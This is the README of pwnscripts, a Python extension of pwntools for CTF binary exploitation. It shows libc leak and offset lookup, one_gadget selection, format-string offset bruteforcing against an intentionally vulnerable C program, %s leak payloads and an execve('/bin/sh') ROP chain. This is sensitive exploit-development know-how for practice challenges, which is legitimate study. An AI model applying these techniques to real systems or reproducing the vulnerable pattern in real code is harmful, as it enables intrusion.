# pwnscripts (0.6.0)
[![Tests](https://github.com/152334H/pwnscripts/workflows/Python%20package/badge.svg)](https://github.com/152334H/pwnscripts/actions)
[![PyPI package](https://badge.fury.io/py/pwnscripts.svg)](https://pypi.org/project/pwnscripts/)
[![Python](https://img.shields.io/pypi/pyversions/pwnscripts)](https://www.python.org/downloads/)

Very simple script(s) to hasten binary exploit creation. To use, `pip install pwnscripts` OR run
```bash
git clone https://github.com/152334H/pwnscripts
cd pwnscripts
pip install -e .
```
and replace `from pwn import *` with `from pwnscripts import *`, e.g.

```python
from pwnscripts import *
context.binary = './my_challenge'
...
```

Additionally, the `libc_database()` extension of pwnscripts requires the [libc-database](https://github.com/niklasb/libc-database).

You might want to look at some of the examples in `user_tests_and_examples.py`.

## Features

Pwnscripts has a number of different features.

### Libc
Things like [LibcSearcher](https://github.com/lieanu/LibcSearcher) have always felt incomplete.

Pwnscripts provides two libc classes: `libc()` and `libc_database()`. The easiest way to start with both is with `context`:
```python
context.libc_database = '/path/to/libc-database'  # https://github.com/niklasb/libc-database
context.libc = '/path/to/pwnscripts/examples/libc.so.6'
```
Anything you can run with `./libc-database/[executable]` is available as a `libc_database()` method: 
```python
>>> context.libc_database.dump('libc6_2.27-3ubuntu1_amd64')
b'offset___libc_start_main_ret = 0x21b97\noffset_system = 0x000000000004f440\noffset_dup2 = 0x00000000001109a0\noffset_read = 0x0000000000110070\noffset_write = 0x0000000000110140\noffset_str_bin_sh = 0x1b3e9a\n'
>>> output = context.libc_database.add()
>>> print(output.decode())
Adding local libc /path/to/pwnscripts/examples/libc.so.6 (id local-18292bd12d37bfaf58e8dded9db7f1f5da1192cb  /path/to/pwnscripts/examples/libc.so.6)
  -> Writing libc /path/to/pwnscripts/examples/libc.so.6 to db/local-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so
  -> Writing symbols to db/local-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.symbols
  -> Writing version info
```
`libc_database()` also has a few additional methods; you can look at the [tests](https://github.com/152334H/pwnscripts/blob/master/test_automated.py) and [examples](https://github.com/152334H/pwnscripts/blob/master/user_tests_and_examples.py) and documentation to see.

---

The `libc()` object is a subclass of pwntools' `pwnlib.elf.elf.ELF()`. It starts off with a base address of `0`, but you can change that to match a remote executable by providing it with leaked addresses:
```python
>>> context.libc.symbols['scanf'] = 0x7fffa3b8b040 # Provide a leaked address to libc
>>> context.libc.address  # This is automagically updated after assignment
0x7fffa3b10000
>>> context.libc.symbols['str_bin_sh']  # Symbols from libc-database are stored in context.libc
0x7fffa3cc3e9a
```

`pwnscripts` is smart about `context.binary`: if `context.libc` is set, `context.binary.process()` will run with that libc version:
```bash
$ gcc -x c - <<< 'int main(){printf("%p\n", printf);}'
$ python3.8
>>> from pwnscripts import *
>>> context.log_level = 'warn'
>>> context.libc_database = 'libc-database'
>>> context.binary = './a.out'
>>> context.libc = 'libc6_2.31-0ubuntu9_amd64'
>>> context.binary.process().recvline()
b'0x7fa0f3c3fe10\n'   # printf 0000000000064e10
>>> context.libc = 'libc6_2.24-11+deb9u4_amd64'
>>> context.binary.process().recvline()
b'0x7fb99b69e190\n'   # printf 000000000004f190
```

`libc()` provides `one_gadget` integration in the form of an interactive selection:
```python
>>> context.libc.select_gadget()
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
 [?] choose the gadget to use: 
       1) 0x4f2c5
       2) 0x4f322
       3) 0x10a38c
     Choice 
```
You're free to shut up the interactive menu by giving `.select_gadget()` an argument:
```python
>>> context.libc.select_gadget(1)
0x4f322
```
More features exist, but this is already too long.

### Format string exploitation
`printf()` challenges are repetitive. Under the `fsb` module, `pwnscripts` makes an attempt to further abstract the process of `printf()` exploitation.

Consider this simple program:
```c
//usr/bin/gcc -pie -fstack-protector-all -z,relro,-z,now "$0" -o test.o; exit
int main(){
  char s[200];
  fgets(s, 199, stdin);
  printf(s);   // leaker
  gets(s+200); // overflow
}
```
Let's further assume that you've decided to exploit this by returning to libc with the buffer overflow present. `printf()` can leak the runtime values of the [stack canary](https://ctf101.org/binary-exploitation/stack-canaries/) && [libc page](#Libc), but only after figuring out the specific stack offset (i.e. figuring out _m_ for `%m$p`) for both of those values.

Similar to the `FmtStr()` class in pwntools, we'll start by setting up a python function to abstract away the i/o associated with this challenge in particular:
```python
>>> @context.quiet
... def printf(line: str) -> bytes:
...   r = context.binary.process()
...   r.send(line)
...   return r.recvline() # return the output of printf()
```
With this function, We can automate the process of offset identification with `fsb.leak_offset`:
```python
>>> context.binary = './test.o'
>>> context.log_level = 'debug' # demonstration
>>> canary_offset = fsb.find_offset.canary(printf)
[DEBUG] cache is at ~/.cache/.pwntools-cache-3.8/fsb-cache/07e93d243fc1a7d88432cfb25bdc8bbb7b65fcabd6bb96ccea9c1ad027f2039f-default
[DEBUG] pwnscripts: extracted 0x7c
[DEBUG] pwnscripts: extracted 0x4141414141414141
... (omitted log) ...
[DEBUG] pwnscripts: extracted 0xcd088451e013aa00
[*] pwnscripts.fsb.find_offset for 'canary': 31
```
With the canary found, we can move on to leaking libc. Since `__libc_start_main_ret` is located immediately after the canary in the stack, the `printf()` cache maintained by `fsb.find_offset` will speed things up immensely:
```python
>>> context.libc_database = '../libc-database'       # replace with yours
>>> libc = libc('/lib/x86_64-linux-gnu/libc.so.6') # ibid
>>> libc_offset = fsb.find_offset.libc(printf,
... offset=libc.symbols['__libc_start_main_ret']&0xfff)  # Specify that we're looking for a value matching __l_s_m_r
[DEBUG] cache is at /home/throwaway/.cache/.pwntools-cache-3.8/fsb-cache/07e93d243fc1a7d88432cfb25bdc8bbb7b65fcabd6bb96ccea9c1ad027f2039f-default
(cached) [DEBUG] pwnscripts: extracted 0x7c
(cached) [DEBUG] pwnscripts: extracted 0x4141414141414141
... (omitted cache log) ...
(cached) [DEBUG] pwnscripts: extracted 0x3ad0d999e654b800
[DEBUG] pwnscripts: extracted 0x0
[DEBUG] pwnscripts: extracted 0x7f17857870b3
[*] pwnscripts.fsb.find_offset for 'libc': 33
```
More examples can be found [here](test_automated.py) and [here](user_tests_and_examples.py).

---

Apart from offset bruteforcing, `pwnscripts.fsb` also contains a `.leak` submodule to make leaking values with `%s` more programmatic.

The simple idea is that you get a payload to leak printf values:
```python
offset = fsb.find_offset.buffer(...) # == 6
payload = fsb.leak.deref_payload(offset, [0x400123, 0x600123])
print(payload)  # b'^^%10$s||%11$s$$#\x01@\x00#\x01`\x00'
```
And after sending the payload, extract the values with a helper function:
```python
r = remote(...)
r.sendline(payload)
print(fsb.leak.deref_extractor(r.recvline()))  # [b'\x80N\x03p\x94\x7f', b' \xeb\x04p\x94\x7f']
```
### Minor features
Pwnscripts also comes with a few minor extensions and functions:
* `util`: utility functions absent from pwntools. Some of the more useful things:
  * `is_addr` is an object you can use to check for specific address types. e.g.
    ```python
    >>> context.arch = 'amd64'
    >>> is_addr.PIE(0x55f83ba1034d)
    True
    >>> is_addr.stack(0xba081240a911)
    False
    >>> is_addr.libc(0x7fba912bd93d)
    True
    ```
    These functions are heuristic-based: they don't guarantee correctness, but tend to hit the mark nonetheless.
  * `unpack_*`: Better unpacking functions. Some examples:
    ```python
    >>> unpack_many_hex(b'jfawoa0x1234aokfw 0x123')
    [0x1234a, 0x123]
    >>> unpack_bytes(b'\x12\x34\x56\x78\x90\xab\xcd\xef', 6)
    0xab9078563412
    ```
* `rop.py`: an extension of pwntools' `pwnlib.rop.rop.ROP`. Core feature is to simplify ROP building outside of SIGROP:
  ```python
  >>> context.arch = 'amd64'
  >>> r = ROP('./binary')
  >>> r.system_call.execve(['/bin/sh',0,0])
  >>> print(r.dump())
    0x0000:         0x44a309 pop rdx; pop rsi; ret
    0x0008:              0x0 [arg3] rdx = 0
    0x0010:              0x0 [arg2] rsi = 0
    0x0018:         0x41e4af pop rax; ret
    0x0020:             0x3b [arg0] rax = SYS_execve
    0x0028:         0x401696 pop rdi; ret
    0x0030:             0x40 [arg1] rdi = AppendedArgument(['/bin/sh'], 0x0)
    0x0038:         0x4022b4 SYS_execve
    0x0040:   b'/bin/sh\x00'
    ```
* As was implicit in prior sections, `context` has been expanded with a number of extra attributes:
   * `.libc` and `.libc_database`, which are useful for everything mentioned [above](#libc)
   * `.is_local`, to check if the most recently opened pwntools `tube` is a remote/local process
* other unlisted features in development

Proper examples for `pwnscripts` are available in `examples/` and `user_tests_and_examples.py`.
## I tried using it; it doesn't work!

File in an [issue](https://github.com/152334H/pwnscripts/issues), if you can. With a single-digit userbase, it's hard to guess what might go wrong, but potentially:
 * pwnscripts is broken
 * Python is outdated (try python3.8+)
 * libc-database is not properly installed/initialised (did you run ./get?)
 * The binary provided is neither i386 or amd64; other architectures are mostly ignored (out of necessity)
 * The challenge is amd64, but `context.arch` wasn't set to `amd64`

     * Set `context.binary` appropriately, or set `context.arch` manually if no binary is given
 * Other unknown reasons. Try making a pull-request if you're interested.

## Updates

See [`CHANGELOG.md`](CHANGELOG.md).

Although version numbers follow the [Semantic Versioning](https://semver.org/) format, backwards compatibility is never assured; historical `pwnscripts` behaviour will be broken where appropriate.

Gradual updates expected as I continue to do pwn.